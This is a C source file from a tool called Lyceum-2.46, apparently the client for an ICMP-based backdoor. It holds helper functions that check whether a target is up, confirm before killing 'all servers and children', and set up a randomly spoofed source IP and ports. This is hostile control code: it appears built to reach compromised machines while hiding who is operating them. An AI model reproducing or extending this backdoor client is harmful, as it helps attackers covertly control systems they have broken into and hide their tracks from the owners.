/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */



#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "lyceum_client.h"
#include "lyceum_proto.h"
#include "lyceum_comcode.h"

#include "icmp_bd.h"

#ifndef _NO_ENCRYPTION_
#include "key.h"
#endif

extern struct lyceum_client target;
extern struct lyceum_filelist dst_list;

char *
my_inet_ntoa (unsigned long ip)
{

  // converts long IP to a string
  struct in_addr addr;

  addr.s_addr = ip;
  return inet_ntoa (addr);
}

int
read_lyceum_ping (int number_to_send)
{
  char *read_buf = NULL;
  int temp;

  temp = number_to_send;

  while (temp--)
    {
      // makes timeout longer each iteration      
      read_buf = udp_listen ((((number_to_send * 2) - temp) + 1));
      parse_lyceum_pkt (read_buf);

      if (packet.com_code == LYM_PING_REPLY)
	{
	  printf ("%s is up\n", my_inet_ntoa (target.dst_ip));
	  break;
	}
    }

  close_socket ();

  return 0;

}

int
verify_kill (void)
{
  char sure = 'n';

  // make sure user wants to kill server
  printf
    ("are you sure you want to kill all servers and children (y/n) [n] ? : ");
  fflush (stdout);
  sure = getchar ();

  if (sure == 'y')
    return 1;
  else
    return 0;
}

void
client_var_init (void)
{
  target.dst_ip = 0;
  target.local_ip = 0;
  target.src_ip = inet_addr (random_ip ());
  target.subnet_ip = NULL;
  target.dst_port = get_random (1024, 65535);
  target.src_port = get_random (1024, 65535);
  strncpy (target.payload, "-1:", 3);

  dst_list.file_toggle = 0;
}
